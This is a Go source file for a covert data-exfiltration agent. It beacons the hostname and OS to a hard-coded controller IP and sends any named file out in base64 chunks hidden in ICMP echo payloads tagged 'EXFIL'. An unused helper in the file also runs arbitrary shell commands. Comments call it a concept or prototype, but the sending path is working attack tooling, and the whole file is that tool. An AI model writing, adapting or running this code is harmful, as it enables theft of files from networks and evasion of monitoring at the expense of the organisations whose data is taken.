package main

import (
	"encoding/base64"
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"time"
)

const (
	ControllerIP = "172.23.30.36" // CHANGE THIS to your controller IP
	MagicBytes   = "EXFIL"
	BeaconInterval = 30 * time.Second
)

// ICMP Message Types
const (
	MsgBeacon   = 'B'
	MsgData     = 'D'
	MsgResponse = 'R'
	MsgCommand  = 'C'
)

func main() {
	if len(os.Args) > 1 {
		// File mode
		filename := os.Args[1]
		exfiltrateFile(filename)
	} else {
		// Beacon mode
		startBeacon()
	}
}

func startBeacon() {
	fmt.Println("[*] Starting Agent Beacon...")
	for {
		// Send Beacon
		hostname, _ := os.Hostname()
		info := fmt.Sprintf("%s|%s_%s", hostname, runtime.GOOS, runtime.GOARCH)
		sendICMP(MsgBeacon, []byte(base64.StdEncoding.EncodeToString([]byte(info))))

		// In a real implementation with raw sockets, we would listen for the reply here
		// For simplicity in this "concept" code, we assume the controller captures our ping
		// To actually RECEIVE commands via ICMP in Go without admin/root allows is hard
		// We would need to listen on the socket.
		//
		// For this prototype, we'll demonstrate the SENDER part mainly as usually agents are behind NAT
		// Receiving ICMP requires the host to route it to us or us to sniff it.
		
		time.Sleep(BeaconInterval)
	}
}

func exfiltrateFile(filepath string) {
	data, err := os.ReadFile(filepath)
	if err != nil {
		log.Printf("Error reading file: %v", err)
		return
	}

	fileID := fmt.Sprintf("%d", time.Now().Unix())
	encoded := base64.StdEncoding.EncodeToString(data)
	chunkSize := 1000 // Safe payload size
	
	chunks := split(encoded, chunkSize)
	totalChunks := len(chunks)

	fmt.Printf("[*] Exfiltrating %s (%d chunks)...\n", filepath, totalChunks)

	for i, chunk := range chunks {
		// Protocol: FILE_ID|CHUNK_NUM|TOTAL_CHUNKS|FILENAME|CONTENT
		payload := fmt.Sprintf("%s|%d|%d|%s|%s", fileID, i+1, totalChunks, filepath, chunk)
		sendICMP(MsgData, []byte(payload))
		time.Sleep(100 * time.Millisecond) // Rate limiting
	}
	fmt.Println("[+] Exfiltration complete")
}

func sendICMP(msgType byte, data []byte) {
	// Construct payload: MAGIC_BYTES|MSG_TYPE|DATA
	payload := append([]byte(MagicBytes), msgType)
	payload = append(payload, data...)

	// We use standard ping via exec to avoid requirement for raw socket privileges on some OSs
	// But to embed CUSTOM payload, we often need raw sockets.
	// Windows 'ping' allows -p for pattern but that's limited.
	// Linux ping -p is also pattern.
	// Best to use raw socket if user has privs.
	
	sender, err := net.Dial("ip4:icmp", ControllerIP)
	if err != nil {
		// Fallback or error
		// Log error but don't crash
		// fmt.Printf("Connection error: %v\n", err) 
		return
	}
	defer sender.Close()

	// Simple ICMP Echo Request
	// Type 8, Code 0, Checksum, ID, Seq, Payload
	msg := make([]byte, 8+len(payload))
	msg[0] = 8 // Echo Request
	msg[1] = 0 // Code
	msg[2] = 0 // Checksum L
	msg[3] = 0 // Checksum H
	msg[4] = 0 // ID
	msg[5] = 1 // ID
	msg[6] = 0 // Seq
	msg[7] = 1 // Seq
	copy(msg[8:], payload)
	
	check := checksum(msg)
	msg[2] = byte(check >> 8)
	msg[3] = byte(check & 0xff)

	sender.Write(msg)
}

func checksum(data []byte) uint16 {
	var sum uint32
	for i := 0; i < len(data)-1; i += 2 {
		sum += uint32(data[i])<<8 | uint32(data[i+1])
	}
	if len(data)%2 == 1 {
		sum += uint32(data[len(data)-1]) << 8
	}
	sum = (sum >> 16) + (sum & 0xffff)
	sum += (sum >> 16)
	return uint16(^sum)
}

func split(s string, chunkSize int) []string {
	if len(s) == 0 {
		return nil
	}
	if chunkSize >= len(s) {
		return []string{s}
	}
	var chunks []string = make([]string, 0, (len(s)-1)/chunkSize+1)
	currentLen := 0
	currentStart := 0
	for i := range s {
		if currentLen == chunkSize {
			chunks = append(chunks, s[currentStart:i])
			currentLen = 0
			currentStart = i
		}
		currentLen++
	}
	chunks = append(chunks, s[currentStart:])
	return chunks
}

func executeCommand(cmd string) string {
	parts := strings.Fields(cmd)
	head := parts[0]
	parts = parts[1:]

	out, err := exec.Command(head, parts...).CombinedOutput()
	if err != nil {
		return err.Error()
	}
	return string(out)
}
